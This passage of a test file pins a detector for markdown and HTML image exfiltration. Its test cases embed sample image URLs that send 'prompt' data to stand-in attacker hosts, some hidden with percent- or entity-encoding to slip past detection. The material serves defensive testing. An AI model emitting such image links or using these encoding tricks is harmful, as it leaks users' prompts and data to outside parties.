    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    const f = out[0];
    const allowed = new Set([
      "Markdown image exfiltration (strong key)",
      "Markdown image exfiltration (weak key)",
      "Markdown image exfiltration (public IP host)",
      "Markdown image exfiltration (private IP host)",
    ]);
    expect(allowed.has(f.technique)).toBe(true);
    expect(f.technique).not.toContain("evil-pct.example");
    expect(f.technique).not.toContain("PAYLOAD-STR");
    expect(f.technique).not.toContain("prompt");
    expect(f.technique).not.toContain("%26");
    expect(f.meta.host).toBe("evil-pct.example");
    expect(f.meta.percentDecoded).toBe(true);
    // R13: content echoes the RAW (encoded) URL, NOT the decoded form.
    expect(f.content).toContain("%26");
    expect(f.content).not.toContain("a=A&prompt");
  });

  it("(j) public IP literal + %26-encoded strong key -> danger (public IP host)", () => {
    // Pin the public-IP tier survives the percent-decode 2-pass.
    const md = `![x](http://203.0.113.42/c?a=A%26prompt=PAYLOAD)`;
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0].severity).toBe("danger");
    expect(out[0].technique).toBe("Markdown image exfiltration (public IP host)");
    expect(out[0].meta).toMatchObject({
      ipKind: "public",
      matchedKey: "prompt",
      percentDecoded: true,
    });
  });

  it("(k) private IP + %26-encoded weak key -> SILENT (matrix mirrored on decoded path)", () => {
    // Private/loopback + weak-only stays silent per v1.9.0 host-tier matrix.
    // The percent-decode 2-pass MUST NOT bypass this rule.
    const md = `![x](http://192.168.1.10/c?a=A%26session=B)`;
    expect(detectMarkdownExfil(md)).toEqual([]);
  });

  it("(l) benign URL without `%` -> fast-path skip (no surface change)", () => {
    // Zero-cost-skip sanity: a URL with no `%` chars must take the
    // `!rawUrl.includes('%')` early return after raw miss. No findings.
    const md = `![x](http://benign.example/p?safe_key=A&other_key=B)`;
    expect(detectMarkdownExfil(md)).toEqual([]);
  });
});

// ---- v1.16.0 Theme T-C: entity + percent matrix ---------------------------
//
// This block pins the full (encoding × image-shape) interaction surface that
// emerged after stacking v1.13.0 entity-decode (html-img path only) and
// v1.15.0 percent-decode (all 3 paths, classifyUrl entry).
//
// Axes:
//   encoding  ∈ { raw, entity-only, percent-only, both }
//   shape     ∈ { inline `![alt](url)`, ref `![a][r]…[r]: url`, html-img }
//
// → 4 × 3 = 12 cells.
//
// Two scope rules drive the expected verdicts and explain the asymmetries:
//
//   1. The percent-decode 2-pass lives INSIDE classifyUrl(), so ALL 3 shapes
//      benefit from it uniformly. A `%26`-encoded `&` separator that hides
//      `prompt` is therefore detected on inline, ref, AND html-img — each
//      with meta.percentDecoded === true.
//
//   2. The entity-decode 2-pass lives in detectMarkdownExfil()'s Pass 4
//      (html-img loop) ONLY. CommonMark does not entity-decode inside `()`,
//      so an `&amp;`-encoded `&` separator that hides `prompt` is detected
//      ONLY in the html-img shape (entityDecoded=true). On inline / ref
//      shapes the raw URL has `prompt` hidden behind `&amp;`, the percent-
//      decode 2-pass is a no-op (no `%`), and the cell stays silent — this is
//      intentional and pinned by the inline-entity-only / ref-entity-only
//      cells below.
//
// The "both" column (entity + percent in the same URL) stacks differently per
// shape:
//   - html-img: entity-decode runs first (Pass 4), then classifyUrl() runs
//     its percent-decode 2-pass on the entity-decoded form. Both flags set.
//   - inline / ref: only classifyUrl() runs, so only percent-decode fires.
//     Result: percentDecoded=true, entityDecoded undefined. The `&amp;`
//     fragments survive as literal text but the `%26`→`&` decode is what
//     exposes `prompt` to the URLSearchParams tokenizer, so the finding is
//     still surfaced — just without the entityDecoded flag.
//
// Each `it` asserts:
//   - finding count (1 for hit, 0 for silent)
//   - severity (always "danger" here — every hit cell carries `prompt`)
//   - element tag matches the shape
//   - meta.host / meta.matchedKey when present
//   - meta.entityDecoded / meta.percentDecoded flag combination matches the
//     2-pass route the cell is expected to take
//
// Notes:
//   - Test-only addition; no source files touched. Core logic unchanged.
//   - All URLs use the unknown attacker host `attacker.example` so the
//     host-tier matrix (R20) doesn't interfere — strong key alone yields
//     danger uniformly. Safe-host / IP-literal interactions are pinned in
//     earlier blocks.
//   - "raw" cells exist to lock the no-flag baseline: a normal `?prompt=...`
//     URL must NOT have entityDecoded or percentDecoded set on the verdict.
describe("md-exfil entity+percent matrix (v1.16.0 Theme T-C)", () => {
  // ---- raw (no encoding) — fast-path raw classifyUrl hit, no flags --------

  it("raw × inline -> danger, no decode flags", () => {
    const md = `![x](http://attacker.example/p?prompt=PAYLOAD)`;
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0].severity).toBe("danger");
    expect(out[0].element).toBe("md-image");
    expect(out[0].meta).toMatchObject({
      host: "attacker.example",
      matchedKey: "prompt",
    });
    expect(out[0].meta.entityDecoded).toBeUndefined();
    expect(out[0].meta.percentDecoded).toBeUndefined();
  });

  it("raw × ref -> danger, no decode flags", () => {
    const url = `http://attacker.example/p?prompt=PAYLOAD`;
    const md = `![x][r]\n\n[r]: ${url}`;
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0].severity).toBe("danger");
    expect(out[0].element).toBe("md-image-ref");
    expect(out[0].meta).toMatchObject({
      host: "attacker.example",
      matchedKey: "prompt",
    });
    expect(out[0].meta.entityDecoded).toBeUndefined();
    expect(out[0].meta.percentDecoded).toBeUndefined();
  });

  it("raw × html-img -> danger, no decode flags", () => {
    const md = `<img src="http://attacker.example/p?prompt=PAYLOAD">`;
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0].severity).toBe("danger");
    expect(out[0].element).toBe("html-img");
    expect(out[0].meta).toMatchObject({
      host: "attacker.example",
      matchedKey: "prompt",
    });
    expect(out[0].meta.entityDecoded).toBeUndefined();
    expect(out[0].meta.percentDecoded).toBeUndefined();
  });

  // ---- entity-only (&amp; hides &) — html-img ONLY decodes ----------------

  it("entity-only × inline -> SILENT (CommonMark doesn't entity-decode in parens)", () => {
    // Raw URL: `?a=A&amp;prompt=B`. URLSearchParams splits on literal `&`, so
    // keys are `a` (off-list) and `amp;prompt` (off-list). 0 strong / 0 weak.
    // No `%` -> percent-decode 2-pass skips. Inline path has NO entity decode,
    // so the cell stays silent. Pins the scope boundary.
    const md = `![x](http://attacker.example/p?a=A&amp;prompt=B)`;
    expect(detectMarkdownExfil(md)).toEqual([]);
  });

  it("entity-only × ref -> SILENT (ref path has no entity decode either)", () => {
    // Same logic as inline-entity-only: ref-image path resolves via refDefs
    // and feeds raw URL straight into classifyUrl() — no entity decode.
    const url = `http://attacker.example/p?a=A&amp;prompt=B`;
    const md = `![x][r]\n\n[r]: ${url}`;
    expect(detectMarkdownExfil(md)).toEqual([]);
  });

  it("entity-only × html-img -> danger via entity-decode 2-pass", () => {
    // Pass 4 (html-img) runs decodeBasicHtmlEntities on the raw src token
    // when raw classifyUrl misses. `&amp;` -> `&` exposes `prompt` to the
    // URLSearchParams tokenizer. entityDecoded=true marks the path;
    // percentDecoded is NOT set because the decoded URL has no `%` left.
    const md = `<img src="http://attacker.example/p?a=A&amp;prompt=B">`;
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0].severity).toBe("danger");
    expect(out[0].element).toBe("html-img");
    expect(out[0].meta).toMatchObject({
      host: "attacker.example",
      matchedKey: "prompt",
      entityDecoded: true,
    });
    expect(out[0].meta.percentDecoded).toBeUndefined();
  });

  // ---- percent-only (%26 hides &) — classifyUrl 2-pass on ALL 3 shapes ----

  it("percent-only × inline -> danger via percent-decode 2-pass", () => {
    // Raw: `?a=A%26prompt=B`. searchParams sees one key `a` with value
    // `A&prompt=B` (since `%26` is value-side bytes). 0 strong / 0 weak ->
    // raw miss. Decode `%26`->`&` -> `?a=A&prompt=B` -> 1 strong -> danger.
    const md = `![x](http://attacker.example/p?a=A%26prompt=B)`;
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0].severity).toBe("danger");
    expect(out[0].element).toBe("md-image");
    expect(out[0].meta).toMatchObject({
      host: "attacker.example",
      matchedKey: "prompt",
      percentDecoded: true,
    });
    expect(out[0].meta.entityDecoded).toBeUndefined();
  });

  it("percent-only × ref -> danger via percent-decode 2-pass", () => {
    // Mirrors the inline cell — ref-image also routes through classifyUrl()
    // so the percent-decode 2-pass applies. Pins ref-path parity.
    const url = `http://attacker.example/p?a=A%26prompt=B`;
    const md = `![x][r]\n\n[r]: ${url}`;
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0].severity).toBe("danger");
    expect(out[0].element).toBe("md-image-ref");
    expect(out[0].meta).toMatchObject({
      host: "attacker.example",
      matchedKey: "prompt",
      percentDecoded: true,
    });
    expect(out[0].meta.entityDecoded).toBeUndefined();
  });

  it("percent-only × html-img -> danger via percent-decode 2-pass (raw path)", () => {
    // html-img Pass 4 tries raw classifyUrl FIRST. Raw classifyUrl itself
    // runs the percent-decode 2-pass internally, so this hits on the raw
    // src token's classifyUrl call WITHOUT entering the entity-decode path.
    // entityDecoded MUST be undefined; percentDecoded must be true.
    const md = `<img src="http://attacker.example/p?a=A%26prompt=B">`;
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0].severity).toBe("danger");
    expect(out[0].element).toBe("html-img");
    expect(out[0].meta).toMatchObject({
      host: "attacker.example",
      matchedKey: "prompt",
      percentDecoded: true,
    });
    expect(out[0].meta.entityDecoded).toBeUndefined();
  });

  // ---- both (&amp; AND %26 in the same URL) — stacks differently per shape

  it("both × inline -> danger via percent only (entityDecoded NOT set)", () => {
    // Raw: `?a=A&amp;b=B%26prompt=C`. URLSearchParams literal-`&`-splits the
    // raw form into `a=A`, `amp;b=B%26prompt=C` (both off-list). 0 strong
    // -> raw miss. Decode `%26`->`&` -> `?a=A&amp;b=B&prompt=C` -> keys are
    // `a`, `amp;b`, `prompt`. 1 strong -> danger. Inline path never runs
    // entity-decode, so the `&amp;` fragment survives as a literal off-list
    // key — but `prompt` is exposed by the `%26` decode alone. Pins that
    // percent-decode works even when other encodings are present in the URL.
    const md = `![x](http://attacker.example/p?a=A&amp;b=B%26prompt=C)`;
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0].severity).toBe("danger");
    expect(out[0].element).toBe("md-image");
    expect(out[0].meta).toMatchObject({
      host: "attacker.example",
      matchedKey: "prompt",
      percentDecoded: true,
    });
    // Entity-decode is html-img scope only — inline NEVER sets this flag.
    expect(out[0].meta.entityDecoded).toBeUndefined();
  });

  it("both × ref -> danger via percent only (entityDecoded NOT set)", () => {
    // Same shape as inline "both" but routed through the reference-image
    // path. Same expected behaviour: percent-decode exposes `prompt`,
    // entity-decode is out of scope. Pins ref-path parity for "both".
    const url = `http://attacker.example/p?a=A&amp;b=B%26prompt=C`;
    const md = `![x][r]\n\n[r]: ${url}`;
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0].severity).toBe("danger");
    expect(out[0].element).toBe("md-image-ref");
    expect(out[0].meta).toMatchObject({
      host: "attacker.example",
      matchedKey: "prompt",
      percentDecoded: true,
    });
    expect(out[0].meta.entityDecoded).toBeUndefined();
  });

  it("both × html-img -> danger with BOTH entityDecoded AND percentDecoded", () => {
    // To force BOTH flags we need a URL where classifyUrl(rawUrl) returns
    // NULL even after its own internal percent-decode 2-pass, so Pass 4
    // falls through to entity-decode and re-classifies the decoded form.
    //
    // URL: `?safekey=A&amp;prompt%3DC` — chosen so percent-decode alone
    // can't reveal `prompt`:
    //   - Raw classifyUrlImpl: keys `safekey`, `amp;prompt%3dc` -> miss.
    //   - Percent-decode raw: `%3D`->`=` -> `?safekey=A&amp;prompt=C`,
    //     keys `safekey`, `amp;prompt` -> still miss. classifyUrl(raw) = null.
    //   - Pass 4 falls through to entity-decode: `&amp;`->`&` ->
    //     `?safekey=A&prompt%3DC`.
    //   - classifyUrl(entity-decoded): inner percent-decode 2-pass fires
    //     -> `?safekey=A&prompt=C` -> keys `safekey`, `prompt` -> HIT.
    //   - Pass 4 then merges `entityDecoded: true` on top of the
    //     `percentDecoded: true` already in decodedVerdict.meta.
    //
    // This is the canonical shape that exercises the FULL 4-stage route
    // (raw -> percent / entity -> entity+percent) and pins both flags
    // surviving the meta merge.
    const md = `<img src="http://attacker.example/p?safekey=A&amp;prompt%3DC">`;
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0].severity).toBe("danger");
    expect(out[0].element).toBe("html-img");
    expect(out[0].meta).toMatchObject({
      host: "attacker.example",
      matchedKey: "prompt",
      entityDecoded: true,
      percentDecoded: true,
    });
  });
});
